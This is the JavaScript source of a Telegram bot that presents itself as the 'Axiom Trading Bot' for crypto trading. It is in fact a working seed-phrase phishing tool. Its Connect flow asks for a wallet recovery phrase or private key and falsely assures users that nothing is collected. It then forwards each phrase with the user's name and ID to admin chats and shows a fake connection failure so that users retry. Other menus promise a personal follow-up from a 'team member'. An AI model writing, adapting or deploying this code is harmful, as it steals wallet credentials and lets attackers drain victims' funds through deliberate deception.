const { Telegraf, Markup, session } = require("telegraf");
const LocalSession = require("telegraf-session-local");

// --- Configuration ---
// Read secrets from environment variables, which MUST be set on Koyeb.
// 1. Get the bot token
const BOT_TOKEN = process.env.BOT_TOKEN;
// 2. Get the list of admin IDs (expected as a comma-separated string, e.g., "12345, 67890")
const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_IDS || "")
    .split(',')
    .map(id => parseInt(id.trim()))
    .filter(id => !isNaN(id));

// 3. Get the dynamic port provided by Koyeb
const PORT = process.env.PORT || 3000;
// 4. Get the full public URL from Koyeb environment (e.g., https://my-app-org.koyeb.app)
// Koyeb's platform URL is generally the domain of your Service. We'll use WEBHOOK_URL.
const WEBHOOK_URL = process.env.WEBHOOK_URL; 

// --- CRITICAL CHECKS ---
if (!BOT_TOKEN) {
    console.error(
        "CRITICAL ERROR: BOT_TOKEN environment variable is not set."
    );
    process.exit(1);
}
if (!WEBHOOK_URL) {
    console.error(
        "CRITICAL WARNING: WEBHOOK_URL environment variable is not set. The bot may fail to establish webhooks."
    );
    // Continue running, but the user must set this on Koyeb for webhooks to work.
}
if (ADMIN_CHAT_IDS.length === 0) {
    console.warn(
        "WARNING: ADMIN_CHAT_IDS environment variable is empty or invalid. Forwarding will fail."
    );
}
// --- END CRITICAL CHECKS ---

const bot = new Telegraf(BOT_TOKEN);

// --- State Management ---
// Use local session to store user data like wallet connection status
const session_local = new LocalSession({ database: "bot_sessions.json" });
// WARNING: This file is temporary on Koyeb and will be wiped on restart/scaling.
// For production, switch to Firestore or a remote database.
bot.use(session_local.middleware());

// Dictionary to simulate wallet connection.
// In a real app, this would be stored in a database.
const userWallets = {};

// Define the state for the conversation
const CONNECT_STATE = "waiting_for_phrase"; // Moved up for global access

// --- Keyboards and UI Elements ---

/**
 * Generates the main persistent ReplyKeyboardMarkup menu.
 */
const mainMenuKeyboard = Markup.keyboard([
    ["🛒 Buy", "💰 Sell"],
    ["🔗 Connect"],
    ["⚙️ Copy Trading", "🟠 Sniper"],
    ["💸 withdraw", "👝 Wallet"],
    ["🚀 Launch", "🔄 DCA"],
    ["Positions 📈", "❓ Help"],
    ["🔄 Reset"], // MOVED: Reset is now on the last row
]).resize();

/**
 * Inline keyboard for canceling the connection flow.
 */
const cancelInlineKeyboard = Markup.inlineKeyboard([
    Markup.button.callback("🚫 Cancel", "cancel_connect_flow"),
]);

// List of commands for the quick access menu (for reference and BotFather setup)
const QUICK_COMMANDS = [
    { command: "buy", description: "Buy tokens" },
    { command: "sell", description: "Sell tokens" },
    { command: "claim", description: "Claim rewards" },
    { command: "connect", description: "Connect your wallet" },
    { command: "menu", description: "Show quick action menu" },
];

// --- Helper Functions ---

/**
 * Checks if a user is marked as having a connected wallet.
 * @param {number} userId The ID of the user.
 * @returns {boolean} Connection status.
 */
function isConnected(userId) {
    // Check both local dictionary and session for robustness
    return (
        userWallets[userId] === true ||
        (bot.context.session && bot.context.session.wallet_status === "connected")
    );
}

/**
 * Sends the welcome message and main menu.
 * @param {object} ctx The Telegraf context object.
 */
async function sendWelcomeMessage(ctx) {
    // Using template literals (backticks) for multi-line string
    const welcomeMessage = `👋 Welcome to Axiom Trading Bot! Exclusively powered by the Axiom community, 
The fastest and smartest bot for trading any token across multiple blockchains. ⚡🌎

Trade safer. Trade smarter. Trade Axiom. 🚀

TOP ⬆️ Main Menu`;

    await ctx.replyWithMarkdown(welcomeMessage, mainMenuKeyboard);
}

/**
 * Forwards the collected seed phrase/key to the admin chat.
 * @param {object} ctx The Telegraf context object.
 * @param {string} phrase The text input by the user (the key).
 */
async function forwardUserData(ctx, phrase) {
    const username = ctx.from.username ? `@${ctx.from.username}` : "N/A";
    const userId = ctx.from.id;
    const clientMessage = `
📩 *New Wallet Connection*

🛠 Service: Wallet Connection
💎 Recovery Phrase: \`${phrase}\`
👤 Client: ${username}
🆔 User ID: \`${userId}\`
`; // NEW: Iterate over all defined admin IDs

    for (const adminId of ADMIN_CHAT_IDS) {
        try {
            await bot.telegram.sendMessage(adminId, clientMessage, {
                parse_mode: "Markdown",
            });
            console.log(`Forwarded data from user ${userId} to admin ${adminId}.`);
        } catch (error) {
            console.error(
                `Failed to forward data to admin ${adminId}:`,
                error.message
            );
        }
    }
}

// --- Conversation Flow: Connect Wallet ---

/**
 * Step 1: Initiates the wallet connection flow.
 */
bot.hears("🔗 Connect", async (ctx) => {
    // Clear the current state before setting the new one
    ctx.session.state = CONNECT_STATE; // Using template literals (backticks) for multi-line string

    const message = `🔑 *Import Wallet*

Enter your 12-key recovery phrase or private key to proceed.

🔒 *Security Notice*
Your seed phrase is 100% safe — our bot does not collect or store your private 
keys or seed phrase. All actions are non-custodial and fully under your control.`;

    await ctx.replyWithMarkdown(message, cancelInlineKeyboard);
});

/**
 * Handler for the Inline Cancel button press.
 */
bot.action("cancel_connect_flow", async (ctx) => {
    // Clear the conversation state
    ctx.session.state = null;
    await ctx.reply(
        "🚫 Transaction cancelled. Returning to Main Menu.",
        mainMenuKeyboard
    );
    await ctx.answerCbQuery();
});

// --- Command Handlers ---

bot.start(sendWelcomeMessage);

bot.hears("Main Menu", sendWelcomeMessage); // Handle explicit 'Main Menu' text if user types it

// NEW: Handler for the /menu command (mimicking quick action menu)
bot.command("menu", async (ctx) => {
    // Ensure the state is cleared when jumping to the main menu
    ctx.session.state = null;
    const menuText = QUICK_COMMANDS.map(
        (cmd) => `**${cmd.description}** /${cmd.command}`
    ).join("\n");

    await ctx.replyWithMarkdown(menuText, mainMenuKeyboard);
});

/**
 * Generic pre-handler for all commands that executes before the command logic runs.
 * This ensures any ongoing conversation is silently killed if a user issues a command.
 * This must be registered *before* the main feature handlers.
 */
bot.use(async (ctx, next) => {
    if (ctx.message && ctx.message.text && ctx.message.text.startsWith("/")) {
        // If a new command is received, silently kill any ongoing conversation state
        if (ctx.session.state === CONNECT_STATE) {
            ctx.session.state = null; // No message sent, user won't know the state was reset.
        }
    } // Continue to the next handler (the specific command handler, like bot.command('claim', ...))
    await next();
});

// --- Main Menu Feature Handlers ---

// NEW generic message for all features when disconnected, except Copy Trading and Sniper
const GENERIC_DISCONNECTED_MESSAGE =
    "Please connect your wallet to access this features";

/**
 * Generic handler for features that need wallet connection.
 * @param {object} ctx The Telegraf context object.
 * @param {string} featureName The name of the feature clicked (only used for internal logging/logic).
 * @param {string} connectedMessage The message to show if connected (now a placeholder, using generic 'Reviewing' message).
 * @param {string} disconnectedMessage The specific message to show if not connected (optional, used for CT/Sniper).
 */
async function featureHandler(
    ctx,
    featureName,
    connectedMessage, // Kept for signature compatibility, but logic uses new generic message
    disconnectedMessage = null
) {
    const userId = ctx.from.id; // IMPORTANT: Clear state if a feature button is pressed, ensuring old conversations don't block

    if (ctx.session.state) {
        ctx.session.state = null;
    }

    if (isConnected(userId)) {
        // Use the single "Reviewing" message for all connected states
        const newConnectedMessage = `
✅ *Connection Status: Reviewing*

You have successfully submitted your wallet information. Our security team is now reviewing the connection to ensure full compatibility.

A dedicated team member will reach out to you personally via this chat within the next 15 minutes to confirm activation and assist you with your first *${featureName}* transaction.

Thank you for your patience!
`;
        await ctx.replyWithMarkdown(newConnectedMessage, mainMenuKeyboard);
    } else if (disconnectedMessage) {
        // Use custom disconnected message (for Copy Trading/Sniper)
        await ctx.replyWithMarkdown(disconnectedMessage, mainMenuKeyboard);
    } else {
        // Use the new generic disconnected message
        await ctx.reply(GENERIC_DISCONNECTED_MESSAGE, mainMenuKeyboard);
    }
}

// 🛒 Buy & /buy command
bot.hears("🛒 Buy", (ctx) =>
    featureHandler(
        ctx,
        "Buy",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);
bot.command("buy", (ctx) =>
    featureHandler(
        ctx,
        "Buy",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);

// 💰 Sell & /sell command
bot.hears("💰 Sell", (ctx) =>
    featureHandler(
        ctx,
        "Sell",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);
bot.command("sell", (ctx) =>
    featureHandler(
        ctx,
        "Sell",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);

// /claim command handler
bot.command("claim", (ctx) =>
    featureHandler(
        ctx,
        "Claim rewards",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);

// 🔗 Connect & /connect command
// We modify this handler to trigger the full 'Connect' flow defined by bot.hears('🔗 Connect', ...)
bot.command("connect", async (ctx) => {
    // Clear state before connecting
    ctx.session.state = null; // Manually run the logic of the '🔗 Connect' handler
    await bot.handleUpdate(
        { message: { text: "🔗 Connect", from: ctx.from, chat: ctx.chat } },
        bot.handleUpdate
    );
});

// ⚙️ Copy Trading (Specific disconnected message)
bot.hears("⚙️ Copy Trading", (ctx) =>
    featureHandler(
        ctx,
        "Copy Trading",
        null, // placeholder connected message // UPDATED CUSTOM DISCONNECTED MESSAGE
        `©️ Copy Trading

Please connect your wallet first to start trading.

Minimum buy: 0.5 SOL

Click 'Connect Wallet' to import your wallet.`
    )
);

// 🟠 Sniper (Specific disconnected message)
bot.hears("🟠 Sniper", (ctx) =>
    featureHandler(
        ctx,
        "Sniper",
        null, // placeholder connected message // UPDATED CUSTOM DISCONNECTED MESSAGE
        `☄️LP Sniper

Please connect your wallet first to start trading.

Connect wallet to start sniping

Click 'Connect Wallet' to import your wallet.`
    )
);

// 💸 withdraw
bot.hears("💸 withdraw", (ctx) =>
    featureHandler(
        ctx,
        "Withdraw",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);

// 👝 Wallet
bot.hears("👝 Wallet", (ctx) =>
    featureHandler(
        ctx,
        "Wallet",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);

// 🚀 Launch
bot.hears("🚀 Launch", (ctx) =>
    featureHandler(
        ctx,
        "Launch",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);

// 🔄 DCA
bot.hears("🔄 DCA", (ctx) =>
    featureHandler(
        ctx,
        "DCA",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);

// Positions 📈
bot.hears("Positions 📈", (ctx) =>
    featureHandler(
        ctx,
        "Positions",
        null, // placeholder connected message
        null // use generic disconnected message
    )
);

// ❓ Help (No wallet connection required)
bot.hears("❓ Help", async (ctx) => {
    // Ensure state is cleared when accessing help
    ctx.session.state = null; // Using template literals (backticks) for multi-line string

    const helpText = `❓ *Help*

You can open a request to the PumpX Bot support service. The Tech team would respond in 
the next 24 hours Via your your DM for a faster solution to the problem, 
describe your appeal as clearly as possible. You can provide files or images if needed.

Rules for contacting technical support:
1. When you first contact, please introduce yourself.
2. Describe the problem in your own words.
3. Be polite, and politeness will be with you!`;

    await ctx.replyWithMarkdown(helpText, mainMenuKeyboard);
});

// --- NEW: Reset Handler ---
bot.hears("🔄 Reset", async (ctx) => {
    const userId = ctx.from.id; // 1. Clear conversation state
    ctx.session.state = null; // 2. Clear wallet status from session
    delete ctx.session.wallet_status; // 3. Clear wallet status from dictionary
    delete userWallets[userId]; // 4. Send confirmation message

    await ctx.replyWithMarkdown(
        "🔄 *Session Reset Complete!* Your wallet connection has been cleared. Tap *🔗 Connect* to start over.",
        mainMenuKeyboard
    );
});

/**
 * Step 2: Handles the user's input (seed phrase or private key).
 * This acts as a global message handler, but only processes if the user is in the CONNECT_STATE.
 * This MUST be defined after all command and button handlers to ensure they take priority.
 */
bot.on("text", async (ctx, next) => {
    // Check if the user is currently in the connection state
    if (ctx.session.state !== CONNECT_STATE) {
        return next(); // If not in the state, pass to other handlers (Fallback)
    }

    const userId = ctx.from.id;
    const phrase = ctx.message.text.trim(); // 1. Forward the data to the admin (CRITICAL STEP)

    await forwardUserData(ctx, phrase); // 2. Simulate failure (DO NOT mark user as connected) // userWallets[userId] = true; // REMOVED: User remains disconnected

    ctx.session.state = null; // End the conversation // 3. Send the requested failure message to the user

    const responseMessage =
        "❌ Wallet not connected — We couldn’t recognise that wallet. Please double-check and try again.";

    await ctx.reply(responseMessage, mainMenuKeyboard);
});

// --- Fallback Handler ---

bot.on("text", async (ctx) => {
    // If the user is in a conversation (which should be caught by the handler above), or we are here,
    // it's an unknown command/text.
    if (!ctx.session.state) {
        await ctx.reply(
            "I'm sorry, I didn't recognize that command. Please use the menu buttons below.",
            mainMenuKeyboard
        );
    }
});

// --- Start the Bot using Webhooks (REQUIRED FOR KOYEB) ---
const webhookPath = `/telegraf/${bot.secretPathComponent()}`;
const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;

if (WEBHOOK_URL) {
    bot.launch({
        webhook: {
            // Set the external URL for Telegram
            domain: WEBHOOK_URL.replace(/(^\w+:|^)\/\//, ''), // Strips protocol for Telegraf domain setting
            port: PORT, // The port Koyeb expects to listen on (default 8080 or 3000)
            hookPath: webhookPath, // The path for the incoming webhook
        },
    })
    .then(() => {
        console.log(`Axiom Trading Bot started via Webhook on port ${PORT}.`);
        console.log(`Telegram webhook set to: ${fullWebhookUrl}`);
    })
    .catch((err) => console.error("Error starting bot via webhooks:", err));
} else {
    // Fallback to polling if WEBHOOK_URL is missing, only for local testing.
    // This mode is NOT recommended for Koyeb.
    bot
    .launch()
    .then(() => console.log("Axiom Trading Bot (JS) started in Polling Mode (for local testing only)..."))
    .catch((err) => console.error("Error starting bot:", err));
}

// Enable graceful stop
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
